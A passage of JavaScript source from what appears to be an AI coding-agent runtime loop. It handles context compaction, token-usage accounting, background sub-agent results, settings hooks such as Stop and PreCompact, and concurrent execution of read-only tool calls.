      level === WarningLevel.WARNING &&
      !budget.hasWarned(WarningLevel.WARNING)
    ) {
      budget.recordWarning(WarningLevel.WARNING);
      yield {
        type: "iteration-warning",
        level,
        message: budget.toWarningMessage(),
        budget: budget.toSummary(),
      };
    } else if (
      level === WarningLevel.WRAPPING_UP &&
      !budget.hasWarned(WarningLevel.WRAPPING_UP)
    ) {
      budget.recordWarning(WarningLevel.WRAPPING_UP);
      yield {
        type: "iteration-warning",
        level,
        message: budget.toWarningMessage(),
        budget: budget.toSummary(),
      };
    }

    // Release result bodies that have left the recent display window before
    // every provider admission, independent of the semantic-compaction token
    // threshold. Settlement persists a bounded resume checkpoint before the
    // live array changes; the earlier hash-chained result events remain the
    // durable evidence for audit/recovery.
    if (options.runtimeResultRetention !== false && messages.length > 32) {
      const retentionConfig =
        options.runtimeResultRetention &&
        typeof options.runtimeResultRetention === "object"
          ? options.runtimeResultRetention
          : options.runtimeResultRetentionOptions;
      const retained = releaseOldLiveSessionResults(messages, retentionConfig);
      if (
        retained.stats.released > 0 &&
        !_sameMessageSnapshot(retained.messages, messages)
      ) {
        const authorityExpectedMessages = [...messages];
        const liveExpectedMessages = [...messages];
        try {
          await _settleAutomaticCompaction({
            messages,
            liveExpectedMessages,
            authorityExpectedMessages,
            compacted: retained.messages,
            stats: retained.stats,
            options,
            trigger: "runtime-retention",
          });
          yield {
            type: "session-runtime-retention",
            runId,
            stats: retained.stats,
          };
        } catch (error) {
          yield {
            type: "session-runtime-retention-degraded",
            runId,
            reason:
              error?.code === "SESSION_REVISION_STALE"
                ? "session_messages_changed_during_retention"
                : "canonical_retention_settlement_failed",
            code: error?.code || "CC_SESSION_RETENTION_SETTLEMENT_FAILED",
          };
        }
      }
    }

    // Headless auto-compaction (Claude-Code `--print` parity). Keeps long
    // `-p` / `--resume` runs under the model's context window instead of
    // growing until the provider rejects the request. Opt-out with
    // `autoCompact: false` (the interactive REPL does this — it compacts on its
    // own schedule). Default-on, gated by the PROMPT_COMPRESSOR flag + a size
    // threshold inside the compressor, so it only fires for genuinely large
    // contexts. Safe to compact here: the previous iteration always finishes
    // its full tool_call→tool_result cycle before we loop, so `messages` has no
    // dangling call; `preserveToolPairs` then guarantees compaction never
    // orphans a tool result. Best-effort — a failure never aborts the run.
    if (
      options.autoCompact !== false &&
      !automaticCompactionSettlementBlocked &&
      messages.length > 4
    ) {
      let compactionUsageState = null;
      let compactionUsageCall = null;
      let compactionObserverFailure = null;
      try {
        const compactor = await _getAutoCompactor(options);
        if (compactor && compactor.shouldAutoCompact(messages)) {
          compactionUsageState = _autoCompactionUsageState(options);
          compactionUsageState.calls = [];
          compactionUsageState.callSequence = budget.consumed;
          // This is the canonical pre-provider authority snapshot. A local
          // micro-compact may change the working input, but the durable CAS must
          // still compare against the transcript state that existed before any
          // in-memory compaction happened.
          const authorityExpectedMessages = [...messages];
          let workingMessages = messages;
          let microStats = null;
          // Cheap surgical pre-pass (Claude-Code microcompact parity): build a
          // candidate that trims old large tool results before the disruptive full
          // summarization. If the trim brings the context back under threshold,
          // the full compaction below is skipped this round — so heavy-tool
          // conversations rarely hit a full summarize. Opt out:
          // autoMicroCompact: false.
          if (
            options.autoMicroCompact !== false &&
            compactor.canonicalKernel !== true
          ) {
            try {
              const { microCompact } = await import("../lib/micro-compact.js");
              const mc = microCompact(messages);
              if (mc.stats.trimmed > 0) {
                workingMessages = mc.messages;
                microStats = {
                  ...mc.stats,
                  strategy: "microcompact",
                  originalMessages: messages.length,
                  compressedMessages: mc.messages.length,
                };
              }
            } catch {
              // microcompact is best-effort — never break the run
            }
          }
          // After the trim, is the full (disruptive) compaction still needed?
          const needFull = compactor.shouldAutoCompact(workingMessages);
          // settings.json PreCompact hooks: a `block` decision SKIPS this
          // compaction round (e.g. the hook archived / owns the history). Fires
          // right before the history would be compacted.
          let preCompactBlocked = false;
          let preCompactReason = null;
          if (!hermeticExecution && needFull && options.settingsHooks) {
            try {
              const pc = await runObserveHooks(
                options.settingsHooks,
                "PreCompact",
                {
                  trigger: "auto",
                  message_count: workingMessages.length,
                  session_id: options.sessionId || null,
                },
                { cwd: options.cwd || process.cwd() },
              );
              if (pc && pc.decision === "block") {
                preCompactBlocked = true;
                preCompactReason = pc.reason || null;
              }
            } catch (_err) {
              // observe-only
            }
          }
          if (preCompactBlocked) {
            yield {
              type: "compaction-skipped",
              runId,
              reason: preCompactReason,
            };
          }
          // Auto-pin (OPT-IN): when enabled, the original task (first user turn)
          // is pinned so compaction can't drop it. Off by default → no predicate
          // is passed and compaction is byte-identical to before.
          let pinOpts = {};
          if (options.autoPin) {
            const { buildAutoPinPredicate } = await import("./auto-pin.js");
            const isPinned = buildAutoPinPredicate(
              workingMessages,
              options.autoPin,
            );
            if (isPinned) pinOpts = { isPinned };
          }
          const fullCompactionApplied = needFull && !preCompactBlocked;
          const { messages: compacted, stats } = !fullCompactionApplied
            ? {
                messages: workingMessages,
                stats: microStats || { strategy: "none", saved: 0 },
              }
            : await compactor.compress(workingMessages, {
                preserveToolPairs: true,
                ...pinOpts,
              });
          if (
            stats?.canonicalReceipt &&
            !["committed", "degraded"].includes(stats.canonicalReceipt.status)
          ) {
            automaticCompactionSettlementBlocked = true;
            yield {
              type: "compaction-degraded",
              runId,
              reason:
                stats.canonicalReceipt.status === "stale"
                  ? "session_messages_changed_during_compaction"
                  : "canonical_compaction_reconciliation_required",
              summaryMode: "none",
              code:
                stats.canonicalReceipt.status === "stale"
                  ? "SESSION_REVISION_STALE"
                  : "CC_COMPACTION_RECONCILIATION_REQUIRED",
              receipt: stats.canonicalReceipt,
            };
            await _awaitBackgroundUsageSettlement(
              backgroundSubAgents,
              backgroundUsageFailureState,
            );
            return;
          }
          const observerFailure = compactionUsageState.calls.find(
            (call) => call.observerFailed,
          );
          if (observerFailure) {
            compactionObserverFailure = observerFailure.observerError;
            compactionUsageState.calls = [];
            throw compactionObserverFailure;
          }
          compactionUsageCall = compactionUsageState.calls.at(-1) || null;
          const compactionUsage = _compactionTokenUsage(stats);
          if (compactionUsageCall?.providerReceipt) {
            yield {
              type: "provider-request-receipt",
              callId: compactionUsageCall.callId,
              workflowEffectId,
              callSequence: compactionUsageCall.callSequence,
              source: "semantic-compaction",
              ...compactionUsageCall.providerReceipt,
            };
          }
          if (stats.degraded === true) {
            const usageOutcomeUnknown = stats.summaryUsageUnknown === true;
            const projectedStats = usageOutcomeUnknown
              ? {
                  ...stats,
                  degradedReason: "semantic-summary-provider-outcome-unknown",
                  summaryUsageUnknownReason:
                    _compactionUsageUnknownReason(stats),
                }
              : stats;
            yield {
              type: "compaction-degraded",
              runId,
              reason: usageOutcomeUnknown
                ? "semantic-summary-provider-outcome-unknown"
                : stats.degradedReason || "semantic-summary-degraded",
              summaryMode: stats.summaryMode || "extractive-fallback",
              stats: projectedStats,
            };
          }
          const compactionUsageMissing =
            stats.summaryUsageUnknown !== true &&
            compactionUsageCall != null &&
            compactionUsage == null;
          if (stats.summaryUsageUnknown === true || compactionUsageMissing) {
            automaticCompactionSettlementBlocked = true;
            const unknownReason = compactionUsageMissing
              ? "provider_usage_not_reported"
              : _compactionUsageUnknownReason(stats);
            if (
              options.strictUsageTelemetry === true &&
              !compactionUsageCall?.callId
            ) {
              throw _runtimeUsageBoundaryFailure(
                null,
                "CC_COMPACTION_USAGE_BOUNDARY_MISSING",
                "Strict semantic compaction produced usage without a real call boundary",
              );
            }
            yield {
              type: "compaction-usage-unknown",
              callId:
                compactionUsageCall?.callId ||
                _newModelUsageCallId("semantic-compaction"),
              runId,
              provider:
                compactionUsageCall?.boundaryNotified === true
                  ? compactionUsageCall.provider
                  : stats.summaryProvider || options.provider || null,
              model:
                compactionUsageCall?.boundaryNotified === true
                  ? compactionUsageCall.model
                  : stats.summaryModel || options.model || null,
              reason: unknownReason,
              code:
                unknownReason === "provider_usage_not_reported"
                  ? "provider_usage_missing"
                  : "provider_call_failed",
              source: "semantic-compaction",
            };
            // Unknown compaction spend makes every hard budget unverifiable;
            // never apply the fallback or initiate the main model call.
            await _awaitBackgroundUsageSettlement(
              backgroundSubAgents,
              backgroundUsageFailureState,
            );
            if (workflowEffectId) {
              throw _markWorkflowCompactionFailureReported(
                _workflowCompactionOutcomeUnknown(
                  null,
                  "CC_WORKFLOW_COMPACTION_USAGE_UNKNOWN",
                  "Workflow-bound semantic compaction usage is unknown",
                ),
              );
            }
            return;
          }
          if (
            stats.saved > 0 &&
            !_sameMessageSnapshot(compacted, authorityExpectedMessages)
          ) {
            const liveExpectedMessages = [...messages];
            try {
              await _settleAutomaticCompaction({
                messages,
                liveExpectedMessages,
                authorityExpectedMessages,
                compacted,
                stats,
                options,
              });
            } catch (error) {
              automaticCompactionSettlementBlocked = true;
              yield {
                type: "compaction-degraded",
                runId,
                reason:
                  error?.code === "SESSION_REVISION_STALE"
                    ? "session_messages_changed_during_compaction"
                    : "canonical_compaction_settlement_failed",
                summaryMode: "none",
                code: error?.code || "CC_COMPACTION_SETTLEMENT_FAILED",
              };
              if (compactionUsage) {
                yield {
                  type: "token-usage",
                  ...(compactionUsageCall
                    ? { callId: compactionUsageCall.callId }
                    : {}),
                  provider:
                    compactionUsageCall?.boundaryNotified === true
                      ? compactionUsageCall.provider
                      : stats.summaryProvider || options.provider || null,
                  model:
                    compactionUsageCall?.boundaryNotified === true
                      ? compactionUsageCall.model
                      : stats.summaryModel || options.model || null,
                  usage: compactionUsage,
                  source: "semantic-compaction",
                  runId,
                };
              }
              // The paid summary call is never retried, and an unknown/stale
              // canonical settlement cannot be followed by another model call.
              await _awaitBackgroundUsageSettlement(
                backgroundSubAgents,
                backgroundUsageFailureState,
              );
              if (workflowEffectId) {
                throw _markWorkflowCompactionFailureReported(
                  _workflowCompactionOutcomeUnknown(
                    error,
                    "CC_WORKFLOW_COMPACTION_SETTLEMENT_UNKNOWN",
                    "Workflow-bound semantic compaction settlement is unknown",
                  ),
                );
              }
              return;
            }
            if (!hermeticExecution) {
              emitHooksV2Event("PostCompact", {
                schema_version: 1,
                trigger: "auto",
                session_id: options.sessionId || null,
                messages_after: messages.length,
                stats,
                cwd: options.cwd || process.cwd(),
              });
            }
            yield {
              type: fullCompactionApplied ? "compaction" : "micro-compaction",
              stats,
              runId,
            };
          }
          if (compactionUsage) {
            // PromptCompressor calls the provider directly, outside the main
            // chat request. Apply/persist the resulting compaction and surface
            // any degraded fallback before yielding billable usage: a
            // headless consumer may stop the generator as soon as its cost cap
            // is exceeded. Usage still arrives exactly once and before the
            // next model call, without entering the normal response path.
            yield {
              type: "token-usage",
              ...(compactionUsageCall
                ? { callId: compactionUsageCall.callId }
                : {}),
              provider:
                compactionUsageCall?.boundaryNotified === true
                  ? compactionUsageCall.provider
                  : stats.summaryProvider || options.provider || null,
              model:
                compactionUsageCall?.boundaryNotified === true
                  ? compactionUsageCall.model
                  : stats.summaryModel || options.model || null,
              usage: compactionUsage,
              source: "semantic-compaction",
              runId,
            };
          }
        }
      } catch (_e) {
        if (isAbortError(_e) || signal?.aborted) throw _e;
        if (_e?.runtimeLedgerPersistence === true) throw _e;
        if (
          _e?.workflowEffectOutcomeUnknown === true &&
          _e?.compactionFailureReported === true
        ) {
          throw _e;
        }
        if (compactionObserverFailure === _e) throw _e;
        const observerFailure = compactionUsageState?.calls?.find(
          (call) => call.observerFailed && call.observerError === _e,
        );
        if (observerFailure) {
          compactionUsageState.calls = [];
          throw _e;
        }
        compactionUsageCall =
          compactionUsageCall || compactionUsageState?.calls?.at(-1) || null;
        if (compactionUsageCall) {
          automaticCompactionSettlementBlocked = true;
          yield {
            type: "compaction-usage-unknown",
            callId: compactionUsageCall.callId,
            runId,
            provider: compactionUsageCall.provider,
            model: compactionUsageCall.model,
            reason: "provider_transport_outcome_unknown",
            code: "provider_call_failed",
            source: "semantic-compaction",
          };
          await _awaitBackgroundUsageSettlement(
            backgroundSubAgents,
            backgroundUsageFailureState,
          );
          if (workflowEffectId) {
            throw _markWorkflowCompactionFailureReported(
              _e?.workflowEffectOutcomeUnknown === true
                ? _e
                : _workflowCompactionOutcomeUnknown(_e),
            );
          }
          return;
        }
        yield {
          type: "compaction-degraded",
          runId,
          reason: `compaction_failed:${_e?.message || String(_e)}`,
          summaryMode: "none",
        };
      }
    }

    // Deliver background sub-agent results that settled since the last turn:
    // inject them as user-role context so THIS LLM call sees them. (There is
    // no open tool_call to attach a late result to — the spawn call already
    // returned its "running" handle.)
    if (backgroundSubAgents.size > 0) {
      for (const entry of _takeSettledBackgroundSubAgents(
        backgroundSubAgents,
      )) {
        _throwBackgroundSubAgentUsageFailure(entry);
        // SubagentStop fires at RESULT time for background spawns (the
        // spawn-time handle skips it); a block reason rides along as feedback.
        if (!hermeticExecution && options.settingsHooks) {
          try {
            const outcome = await runObserveHooks(
              options.settingsHooks,
              "SubagentStop",
              {
                stop_hook_active: false,
                session_id: options.sessionId || null,
                subagent_response: JSON.stringify(
                  entry.outcome?.result || { error: entry.outcome?.error },
                ).substring(0, 2000),
              },
              { cwd: toolContext.cwd },
            );
            if (outcome.decision === "block" && outcome.reason) {
              entry.hookFeedback = outcome.reason;
            }
          } catch (_err) {
            // SubagentStop hooks are best-effort
          }
        }
        messages.push({
          role: "user",
          content: _backgroundSubAgentResultText(entry),
        });
        yield {
          type: "background-sub-agent-result",
          runId,
          subAgentId: entry.id,
          role: entry.role,
          error: entry.outcome?.error || null,
          summary: entry.outcome?.result?.summary || null,
          childBinding: entry.recoveryBinding?.() || null,
        };
      }
    }

    // Result-delivery hooks and context preparation can yield long enough for
    // a detached child's synchronous ledger failure to settle. Keep the final
    // dispatch fence adjacent to construction of the paid parent request.
    _throwBackgroundUsageFailureState(backgroundUsageFailureState);
    _throwSettledBackgroundUsageFailure(backgroundSubAgents);

    // Turn-scoped context injection (open-agents prepareCall parity).
    // prepareCall runs fresh each iteration and returns an ephemeral
    // system-message supplement that is NOT persisted to messages history.
    let callMessages = messages;
    const contextMemoryTrustedSystemIndexes = [];
    if (!hermeticExecution && typeof options.prepareCall === "function") {
      try {
        const hook = await options.prepareCall({
          iteration: budget.consumed,
          cwd: toolContext.cwd,
          sessionId: toolContext.sessionId,
        });
        if (
          hook &&
          typeof hook.systemSuffix === "string" &&
          hook.systemSuffix
        ) {
          callMessages = [
            ...messages,
            { role: "system", content: hook.systemSuffix },
          ];
          contextMemoryTrustedSystemIndexes.push(callMessages.length - 1);
        }
      } catch (_e) {
        // prepareCall failures are non-critical — proceed with original messages
      }
    }

    // Per-span unified ids (P2 observability): the run-level default attributes
    // stamp session/agent/workflow ids on every span, but turn/prompt ids are
    // per-iteration. A "turn" is one model iteration of the run; "prompt" is the
    // model request within that turn. Normalized through buildTelemetryAttributes
    // so they get the same charset-sanitized + cardinality-bounded treatment as
    // the run-level ids (turn.id correlates with the agent.iteration counter).
    let canonicalProviderContext = null;
    if (options.contextMemorySkipPlanning !== true) {
      const { prepareCanonicalProviderContext } =
        await import("../lib/context-memory-kernel/provider-context.js");
      canonicalProviderContext = await prepareCanonicalProviderContext(
        callMessages,
        {
          ...options,
          contextMemoryToolDefinitions:
            getEffectiveToolDefinitions(effectiveToolOptions),
          contextMemoryTrustedSystemIndexes,
        },
      );
      if (canonicalProviderContext.plan) {
        callMessages = canonicalProviderContext.messages;
        yield {
          type: "context.plan.created",
          plan: canonicalProviderContext.plan,
          recallDigest: canonicalProviderContext.recall?.digest || null,
        };
      }
    }

    const modelIdAttrs = recorder
      ? buildTelemetryAttributes({
          turnId: `${runId}:t${budget.consumed}`,
          promptId: `${runId}:t${budget.consumed}:p`,
        })
      : null;
    throwIfAborted(signal);
    _throwBackgroundUsageFailureState(backgroundUsageFailureState);
    _throwSettledBackgroundUsageFailure(backgroundSubAgents);
    const providerRequestId = _workflowProviderRequestId(
      workflowEffectId,
      "model",
      budget.consumed,
    );
    const plannedProviderOptions = canonicalProviderContext?.plan
      ? {
          ...effectiveToolOptions,
          contextEngine: null,
          contextMemoryPreplanned: true,
          contextMemorySelectedToolNames:
            canonicalProviderContext.selectedToolNames,
        }
      : effectiveToolOptions;
    const providerCallOptions = providerRequestId
      ? { ...plannedProviderOptions, providerRequestId }
      : plannedProviderOptions;
    const modelUsageCall = {
      type: "model-usage-started",
      callId: _newModelUsageCallId("model"),
      provider: options.provider || "ollama",
      model: options.model || "unknown",
      source: "model",
      ...(providerRequestId
        ? {
            workflowEffectId,
            callSequence: budget.consumed,
            providerRequestId,
            requestIdentitySemantics: "trace-only",
          }
        : {}),
    };
    // The consumer receives this boundary before `.next()` resumes into the
    // provider call, so a durable append failure can prevent spend.
    yield modelUsageCall;
    // A background child can fail its synchronous settlement write while the
    // parent boundary is being persisted by the host. Re-check at the last
    // synchronous admission point before dispatching this paid call.
    try {
      _throwBackgroundUsageFailureState(backgroundUsageFailureState);
      _throwSettledBackgroundUsageFailure(backgroundSubAgents);
    } catch (backgroundFailure) {
      // The host has already persisted this parent boundary. Close it with the
      // same id before surfacing the detached child's authoritative failure.
      yield {
        type: "model-usage-unknown",
        callId: modelUsageCall.callId,
        provider: modelUsageCall.provider,
        model: modelUsageCall.model,
        source: modelUsageCall.source,
        code: "provider_call_failed",
      };
      throw backgroundFailure;
    }

    let result;
    let providerReceipt = null;
    try {
      result = await _withSpan(
        recorder,
        "agent.model",
        {
          "gen_ai.system": options.provider || "ollama",
          "gen_ai.request.model": options.model || "unknown",
          "agent.iteration": budget.consumed,
          ...(modelIdAttrs || {}),
        },
        () => llmCall(callMessages, providerCallOptions),
        (span, r) => {
          const t = _usageTokens(r?.usage);
          if (t) {
            if (t.input != null)
              span.setAttribute("gen_ai.usage.input_tokens", t.input);
            if (t.output != null)
              span.setAttribute("gen_ai.usage.output_tokens", t.output);
            // Cache read/write tokens — the prompt-caching hit rate the plan's
            // reliability telemetry cares about.
            if (t.cacheRead != null)
              span.setAttribute("gen_ai.usage.cache_read_tokens", t.cacheRead);
            if (t.cacheWrite != null)
              span.setAttribute(
                "gen_ai.usage.cache_write_tokens",
                t.cacheWrite,
              );
          }
          span.setAttribute(
            "agent.has_tool_calls",
            Array.isArray(r?.message?.tool_calls) &&
              r.message.tool_calls.length > 0,
          );
          // response CONTENT is opt-in (--otlp-content): stamped only when
          // enabled, redacted + length-capped through the same normalizer; the
          // field is entirely absent by default so default OTLP stays unchanged.
          if (options.otlpIncludeContent === true && r?.message?.content) {
            const respAttrs = buildTelemetryAttributes(
              { response: r.message.content },
              { includeContent: true },
            );
            if (respAttrs["content.response"] != null) {
              span.setAttribute(
                "content.response",
                respAttrs["content.response"],
              );
            }
          }
        },
        "model_error",
      );
      providerReceipt = providerRequestId
        ? _snapshotProviderRequestReceipt(
            result?.providerReceipt,
            providerRequestId,
            modelUsageCall.provider,
          )
        : null;
    } catch (error) {
      // Never retain provider error text in the usage ledger. Pause on a fixed
      // unknown settlement, then rethrow only after the consumer resumes.
      yield {
        type: "model-usage-unknown",
        callId: modelUsageCall.callId,
        provider: modelUsageCall.provider,
        model: modelUsageCall.model,
        source: modelUsageCall.source,
        code: "provider_call_failed",
      };
      await _awaitBackgroundUsageSettlement(
        backgroundSubAgents,
        backgroundUsageFailureState,
      );
      throw error;
    }
    if (recorder) recorder.counter("agent.model.calls", 1);
    const msg = result?.message;

    if (providerReceipt) {
      // Yield the provider-returned identifiers before billable usage. A host
      // that stops after a cost boundary still retains the exact request/effect
      // binding. This is trace evidence only, never an exactly-once assertion.
      yield {
        type: "provider-request-receipt",
        callId: modelUsageCall.callId,
        workflowEffectId,
        callSequence: budget.consumed,
        source: modelUsageCall.source,
        ...providerReceipt,
      };
    }

    // Close the already-persisted call boundary before honoring an abort that
    // raced with a successful provider response. Once the transport returned,
    // dropping this settlement would strand a durable `started` row forever.
    if (_hasCompleteProviderUsage(result?.usage)) {
      yield {
        type: "token-usage",
        callId: modelUsageCall.callId,
        provider: modelUsageCall.provider,
        model: modelUsageCall.model,
        usage: result.usage,
      };
    } else {
      yield {
        type: "model-usage-unknown",
        callId: modelUsageCall.callId,
        provider: modelUsageCall.provider,
        model: modelUsageCall.model,
        source: modelUsageCall.source,
        code: "provider_usage_missing",
      };
    }
    throwIfAborted(signal);

    if (!msg) {
      await _awaitBackgroundUsageSettlement(
        backgroundSubAgents,
        backgroundUsageFailureState,
      );
      yield { type: "response-complete", content: "(No response from LLM)" };
      yield { type: "run-ended", runId, reason: "no-response" };
      return;
    }

    const toolCalls = msg.tool_calls;

    if (!toolCalls || toolCalls.length === 0) {
      // A final answer while background sub-agents are still outstanding is
      // premature — their results must not be silently lost. Wait for ALL of
      // them, inject the results, and give the model one more turn to fold
      // them into its real final answer. The iteration budget is the backstop
      // if it keeps spawning more.
      if (backgroundSubAgents.size > 0) {
        yield {
          type: "waiting-background-sub-agents",
          runId,
          count: backgroundSubAgents.size,
        };
        await Promise.all(
          [...backgroundSubAgents.values()].map((e) => e.promise),
        );
        _throwBackgroundUsageFailureState(backgroundUsageFailureState);
        throwIfAborted(signal);
        messages.push({ role: "assistant", content: msg.content || "" });
        for (const entry of _takeSettledBackgroundSubAgents(
          backgroundSubAgents,
        )) {
          _throwBackgroundSubAgentUsageFailure(entry);
          messages.push({
            role: "user",
            content:
              _backgroundSubAgentResultText(entry) +
              "\n\nAll background sub-agents have finished. Incorporate their results and give your final answer.",
          });
          yield {
            type: "background-sub-agent-result",
            runId,
            subAgentId: entry.id,
            role: entry.role,
            error: entry.outcome?.error || null,
            summary: entry.outcome?.result?.summary || null,
            childBinding: entry.recoveryBinding?.() || null,
          };
        }
        continue;
      }
      // Surface the final answer's extended-thinking reasoning (Anthropic, when
      // --think is on) so non-streaming consumers (the REPL) can show it. The
      // streaming path forwards reasoning live via onThinking instead.
      const _thinking = Array.isArray(msg._thinkingBlocks)
        ? msg._thinkingBlocks
            .map((b) => b.thinking || "")
            .join("")
            .trim()
        : "";
      // Claude Code 2.1.183 parity: a turn that produced ONLY extended-thinking
      // (no visible text, no tool calls) would otherwise complete silently with
      // an empty answer — the user sees nothing. Re-prompt the model ONCE to
      // surface its actual response. Mirrors the Stop-hook continuation path
      // below (push assistant turn + a user nudge, then continue). Scoped to the
      // thinking-only case so a genuinely empty completion (no thinking) still
      // ends instead of looping.
      const _contentEmpty = !String(msg.content || "").trim();
      if (_contentEmpty && _thinking && !emptyThinkingReprompted) {
        emptyThinkingReprompted = true;
        messages.push({ role: "assistant", content: "" });
        messages.push({
          role: "user",
          content:
            "You ended your turn with only internal reasoning and no visible " +
            "response. Please provide your actual answer now.",
        });
        yield { type: "empty-thinking-reprompt", runId };
        continue;
      }
      yield {
        type: "response-complete",
        content: msg.content || "",
        ...(_thinking ? { thinking: _thinking } : {}),
      };
      // settings.json Stop hooks: a `block` decision FORCES the agent to keep
      // going instead of stopping — the reason is injected as a new instruction.
      // `stop_hook_active` lets the hook avoid an infinite loop; the iteration
      // budget is the hard backstop.
      if (!hermeticExecution && options.settingsHooks) {
        let stopOutcome = null;
        try {
          stopOutcome = await runObserveHooks(
            options.settingsHooks,
            "Stop",
            {
              stop_hook_active: stopHookActive,
              final_response: String(msg.content || "").substring(0, 2000),
              session_id: options.sessionId || null,
            },
            { cwd: options.cwd || process.cwd() },
          );
          const failures = (stopOutcome?.results || []).filter(
            (result) =>
              result?.nonBlockingError === true ||
              result?.malformedDecision === true ||
              result?.breakerOpen === true,
          );
          if (failures.length > 0) {
            emitHooksV2Event("StopFailure", {
              schema_version: 1,
              session_id: options.sessionId || null,
              run_id: runId,
              phase: "stop-hook",
              failures: failures.map((failure) => ({
                command: failure.command || null,
                exit_code: failure.exitCode ?? null,
                reason: failure.reason || failure.error || null,
              })),
            });
          }
        } catch (error) {
          emitHooksV2Event("StopFailure", {
            schema_version: 1,
            session_id: options.sessionId || null,
            run_id: runId,
            phase: "stop-hook",
            reason: error?.message || String(error),
          });
          stopOutcome = null; // never affect the run outcome
        }
        if (stopOutcome && stopOutcome.decision === "block") {
          stopHookActive = true;
          messages.push({ role: "assistant", content: msg.content || "" });
          messages.push({
            role: "user",
            content:
              stopOutcome.reason ||
              "A Stop hook requested that you keep working.",
          });
          yield {
            type: "stop-hook-continue",
            runId,
            reason: stopOutcome.reason || null,
          };
          continue;
        }
      }
      yield { type: "run-ended", runId, reason: "complete" };
      return;
    }

    // Intermediate-step reasoning (Anthropic, --think): the model's reasoning
    // before it chose these tool calls. Streaming consumers already get it live
    // via onThinking, so only surface it as an event for non-streaming consumers
    // (the REPL) — keeps it out of the --include-partial-messages stream.
    if (!options.onThinking && Array.isArray(msg._thinkingBlocks)) {
      const _stepThinking = msg._thinkingBlocks
        .map((b) => b.thinking || "")
        .join("")
        .trim();
      if (_stepThinking) yield { type: "thinking", text: _stepThinking };
    }

    // Add assistant message with tool calls
    messages.push(msg);

    // Concurrent READ-ONLY batch (latency optimization). When every call in the
    // turn is a well-formed read-only built-in (pure fs/DB reads — no mutation,
    // no process spawn, no shared-state writes) and there is no interactive
    // confirmer in play, run them concurrently so wall-clock drops from the SUM
    // of the reads to their MAX — the common "read these N files" case. Crucially,
    // Every `tool-executing` boundary is YIELDED before dispatch, giving the
    // host a chance to durably record every call. Tool results stay in call order;
    // correlation stays deterministic even though the reads themselves overlap.
    // Any mutating/unknown/MCP tool in the batch, a single call, an interactive
    // session (concurrent prompts would race), or `parallelReadOnlyTools: false`
    // falls through to the strictly sequential loop below.
    const parallelReads =
      options.parallelReadOnlyTools !== false &&
      toolCalls.length > 1 &&
      !toolContext.permissionConfirm &&
      toolCalls.every(
        (c) =>
          typeof c?.function?.name === "string" &&
          _CHECKPOINT_READ_ONLY.has(c.function.name),
      );
    if (parallelReads) {
      throwIfAborted(signal);
      const turnId = `${runId}:t${budget.consumed}`;
      const toolBatchRecords = [];
      const prepared = toolCalls.map((call) => {
        let toolArgs;
        try {
          toolArgs =
            typeof call.function.arguments === "string"
              ? JSON.parse(call.function.arguments)
              : call.function.arguments;
        } catch {
          toolArgs = {};
        }
        const workflowBinding = _workflowToolEffectBinding(
          workflowEffectId,
          workflowEffectId ? (workflowChildEffectSequence += 1) : 0,
          call.id,
          call.function.name,
        );
        return { call, toolArgs, workflowBinding };
      });
      // Yield every start boundary before dispatch. Async-generator consumers
      // persist each boundary before asking for the next item, so by the time
      // this loop finishes all parallel calls have durable started records.
      const startedPrepared = [];
      try {
        throwIfAborted(signal);
        _throwBackgroundUsageFailureState(backgroundUsageFailureState);
        for (const { call, toolArgs, workflowBinding } of prepared) {
          yield {
            type: "tool-executing",
            tool: call.function.name,
            args: toolArgs,
            tool_use_id: call.id,
            turn_id: `${runId}:t${budget.consumed}`,
            ...(workflowBinding || {}),
          };
          startedPrepared.push({ call, toolArgs, workflowBinding });
          throwIfAborted(signal);
        }
        _throwBackgroundUsageFailureState(backgroundUsageFailureState);
      } catch (admissionFailure) {
        for (const { call, workflowBinding } of startedPrepared) {
          yield {
            type: "tool-result",
            tool: call.function.name,
            result: { error: "Tool execution cancelled before dispatch" },
            error: "tool execution cancelled before dispatch",
            tool_use_id: call.id,
            turn_id: `${runId}:t${budget.consumed}`,
            ...(workflowBinding || {}),
          };
        }
        throw admissionFailure;
      }
      // Only after every start has been consumed do we kick every read off.
      // Settle each promise into {result,error} so an abort before its ordered
      // result is consumed can never surface an unhandled rejection.
      const inflight = prepared.map(({ call, toolArgs, workflowBinding }) => {
        const promise = executeTool(call.function.name, toolArgs, {
          ...toolContext,
          toolCallId: call.id,
          turnId: `${runId}:t${budget.consumed}`,
          ...(workflowBinding || {}),
        }).then(
          (result) => ({ result, error: null }),
          (err) => ({
            result: {
              error: err.message,
              ...(workflowBinding
                ? {
                    code: "CC_WORKFLOW_NESTED_TOOL_EXECUTION_THROWN",
                    outcomeUnknown: true,
                  }
                : {}),
            },
            error: err.message,
          }),
        );
        return { call, toolArgs, workflowBinding, promise };
      });
      for (const { call, toolArgs, workflowBinding, promise } of inflight) {
        throwIfAborted(signal);
        _throwBackgroundUsageFailureState(backgroundUsageFailureState);
        const { result: toolResult, error: toolError } = await promise;
        throwIfAborted(signal);
        const failed = emitToolHookLifecycle({
          tool: call.function.name,
          args: toolArgs,
          result: toolResult,
          error: toolError,
          sessionId: options.sessionId || null,
          turnId,
          toolUseId: call.id,
          cwd: options.cwd || process.cwd(),
          emit: lifecycleHookEmitter,
        });
        toolBatchRecords.push({
          tool: call.function.name,
          toolUseId: call.id,
          failed,
        });
        const warningMsg = budget.toWarningMessage();
        const resultStr = capToolResultString(
          safeStringifyToolResult(toolResult),
        );
        const toolContent = warningMsg
          ? `${resultStr}\n\n${warningMsg}`
          : resultStr;
        const decision = permissionDecision(
          call.id,
          call.function.name,
          toolResult,
        );
        yield {
          type: "tool-result",
          tool: call.function.name,
          result: toolResult,
          error: toolError,
          tool_use_id: call.id,
          turn_id: `${runId}:t${budget.consumed}`,
          ...(workflowBinding || {}),
          permission_decision_id: decision?.id || null,
          permission_decision: decision,
        };
        const nestedOutcomeUnknown = _workflowNestedToolOutcomeUnknown(
          workflowBinding,
          call.function.name,
          toolResult,
        );
        if (nestedOutcomeUnknown) throw nestedOutcomeUnknown;
        messages.push({
          role: "tool",
          content: toolContent,
          tool_call_id: call.id,
        });
      }
      emitToolBatchHookLifecycle({
        records: toolBatchRecords,
        sessionId: options.sessionId || null,
        turnId,
        cwd: options.cwd || process.cwd(),
        parallel: true,
        emit: lifecycleHookEmitter,
      });
      continue; // all read results in place — back to the LLM call
    }

    const turnId = `${runId}:t${budget.consumed}`;
    const toolBatchRecords = [];
    for (const call of toolCalls) {
      throwIfAborted(signal);
      _throwBackgroundUsageFailureState(backgroundUsageFailureState);
      const fn = call?.function;
      const toolName = fn?.name;
      // A malformed tool call (no `function` / no `name` — a provider quirk or a
      // bad MCP tool definition) must not crash the whole turn with a TypeError.
